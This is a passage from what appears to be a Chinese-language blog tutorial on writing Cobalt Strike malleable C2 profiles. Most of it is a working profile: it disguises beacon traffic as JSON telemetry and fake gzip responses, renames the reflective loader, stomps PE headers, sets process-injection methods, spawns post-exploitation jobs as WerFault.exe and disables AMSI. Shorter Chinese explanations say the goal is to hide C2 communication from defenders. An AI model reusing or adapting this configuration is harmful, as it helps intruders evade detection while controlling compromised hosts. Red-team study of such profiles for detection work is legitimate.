                print;
            }
        }
    }
    # define indicators for an set POST
    http-post {
        set uri "/api/v1/Telemetry/Id/";
        set verb "POST";
        client {
            # make it look like we're posting something cool.
            header "Content-Type" "application/json";
            header "Accept-Encoding" "deflate, gzip;q=1.0, *;q=0.5";
            # ugh, our data has to go somewhere!
            output {
                mask;
                base64url;
                uri-append;
            }
            # randomize and post our session ID
            id {
                mask;
                base64url;
                prepend "{version: 1, d=\x22";            
                append "\x22}\n";
                print;
            }
        }
        # The server's response to our set POST
        server {
            header "Content-Type" "application/octet-stream";
            header "Content-Encoding" "gzip";
            # post usually sends nothing, so let's prepend a string, mask it, and
            # base64 encode it. We'll get something different back each time.
            output {
                mask;
                base64;
                prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03";
                append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";          
                print;
            }
        }
    }
    stage {
    #    The transform-x86 and transform-x64 blocks pad and transform Beacon’s
    # Reflective DLL stage. These blocks support three commands: prepend, append, and strrep.
        transform-x86 {
            prepend "\x90\x90";
            strrep "ReflectiveLoader" "DoLegitStuff";
        }
        transform-x64 {
            # transform the x64 rDLL stage, same options as with 
        }
        stringw "I am not Beacon";
        #set allocator "MapViewOfFile";  # HeapAlloc,MapViewOfFile, and VirtualAlloc. 
        set cleanup "true";        # Ask Beacon to attempt to free memory associated with 
                                    # the Reflective DLL package that initialized it.
        # Override the first bytes (MZ header included) of Beacon's Reflective DLL. 
        # Valid x86 instructions are required. Follow instructions that change
        # CPU state with instructions that undo the change.
    #    set magic_mz_x86 "MZRE";
    #    set magic_mz_x86 "MZAR";
        #set magic_pe "PE";  #Override PE marker with something else
        # Ask the x86 ReflectiveLoader to load the specified library and overwrite
        #  its space instead of allocating memory with VirtualAlloc.
        # Only works with VirtualAlloc
        #set module_x86 "xpsservices.dll";
        #set module_x64 "xpsservices.dll";
        # Obfuscate the Reflective DLL’s import table, overwrite unused header content, 
        # and ask ReflectiveLoader to copy Beacon to new memory without its DLL headers.
        set obfuscate "false"; 
        # Obfuscate Beacon, in-memory, prior to sleeping
        set sleep_mask "false";
        # Use embedded function pointer hints to bootstrap Beacon agent without 
        # walking kernel32 EAT
        #set smartinject "true";
        # Ask ReflectiveLoader to stomp MZ, PE, and e_lfanew values after 
        # it loads Beacon payload
        set stomppe "true";
        # Ask ReflectiveLoader to use (true) or avoid RWX permissions (false) for Beacon DLL in memory
        set userwx "false";
        # PE header cloning - see "petool", skipped for now
        #set compile_time "14 Jul 2018 8:14:00";
    #    set image_size_x86 "512000";
    #    set image_size_x64 "512000";
        set entry_point "92145";
        #The Exported name of the Beacon DLL
        #set name "beacon.x64.dll" 
        #set rich_header  # I don't understand this yet TODO: fixme
        #TODO: add examples process-inject 
    }
    process-inject {
            # set how memory is allocated in a remote process
            # VirtualAllocEx or NtMapViewOfSection. The
            # NtMapViewOfSection option is for same-architecture injection only. 
            # VirtualAllocEx is always used for cross-arch memory allocations.
            set allocator "VirtualAllocEx";
            # shape the memory characteristics and content
            set min_alloc "16384";
            set startrwx "true";
            set userwx "false";
            transform-x86 {
            prepend "\x90\x90";
            }
            transform-x64 {
            # transform x64 injected content
            }
            # determine how to execute the injected code
            execute {
                CreateThread "ntdll.dll!RtlUserThreadStart";
                SetThreadContext;
                RtlCreateUserThread;
            }
    }
    post-ex {
        # control the temporary process we spawn to
        set spawnto_x86 "%windir%\\syswow64\\WerFault.exe";
        set spawnto_x64 "%windir%\\sysnative\\WerFault.exe";
        # change the permissions and content of our post-ex DLLs
        set obfuscate "true";
        # change our post-ex output named pipe names...
        #set pipename "msrpc_####, win\\msrpc_##";
        # pass key function pointers from Beacon to its child jobs
        set smartinject "true";
        # disable AMSI in powerpick, execute-assembly, and psinject
        set amsi_disable "true";
        #The thread_hint option allows multi-threaded post-ex DLLs to spawn 
        # threads with a spoofed start address. Specify the thread hint as 
        # “module!function+0x##” to specify the start address to spoof. 
        # The optional 0x## part is an offset added to the start address.
        # set thread_hint "....TODO:FIXME"
        # options are: GetAsyncKeyState (def) or SetWindowsHookEx
        #set keylogger "GetAsyncKeyState";
    }
在文件的开头利用set来设置默认值，存在全局和本地两个选项
sleeptime为设置心跳包时间，单位为毫秒；jitter为默认的抖动因子（0-99%）；maxdns为通过DNS上传数据时的主机名最大长度（0-255）；useragent为设置http通信使用的用户代理。ua可以通过浏览器抓包进行修改，后面的http-get和http-post一般有着一个通用格式
    protocol-transaction {
    set local_option "value";
    client {
    # customize client indicators
    }
    server {
    # customize server indicators
    }
    }
开头的protocol-transaction即为具体使用的http方法，client与server就是对http中的request与response的具体配置，header指定具体的http请求头与相应头信息。
    metadata {
                # XOR encode the value
                mask;
                # URL-safe Base64 Encode
                #base64url;
                # URL-safe Base64 Encode
                base64;
                # NetBIOS Encode ‘a’ ?
                #netbios;
                #NetBIOS Encode ‘A’
                #netbiosu;
                # You probably want these to be last two, else you will encode these values
                # Append a string to metadata
                append ";" ;
                # Prepend a string
                prepend "SESSION=";
                # Terminator statements - these say where the metadata goes
                # Pick one
                # Append to URI
                #uri-append;
                #Set in a header
                header "Cookie";
                #Send data as transaction body
                #print
                #Store data in a URI parameter
                #parameter "someparam"
            }
这里制定了对metadata进行base64编码，Prepend语句在编码后的数据前面添加相应字符串，append语句为在末尾追加字符串。最后存储在cookie字段里面。获取真正的metadata则是对http中相应数据进行逆操作，最终得到所要的metadata
    output {
                mask;
                base64;
                prepend "\x1F\x8B\x08\x08\xF0\x70\xA3\x50\x00\x03";
                append "\x7F\x01\xDD\xAF\x58\x52\x07\x00";          
                print;
            }
print语句是将data作为transaction的内容进行发送
大概的修改就是按照这样一个简单的逻辑进行修改的，原理就是在通信时对http的流量包进行更改伪造，通过加载相应的profile文件，来改变目标主机与server端的流量特征，以此来隐藏流量，最终达到通信隐匿的目的。
# 总结
cs作为一个神器，需要学的地方还是很多的，以后还是要多进行学习才行